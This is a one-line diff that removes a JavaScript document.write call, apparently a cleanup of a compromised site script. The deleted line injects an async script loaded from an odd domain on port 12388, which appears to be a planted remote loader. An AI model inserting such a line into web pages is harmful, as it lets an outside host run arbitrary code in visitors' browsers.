@@ -1,1 +1,0 @@
-﻿document.write('<script async='async' src='https:\/\/京东科技.site:12388\/xxd.php?id=4437'><\/script>');
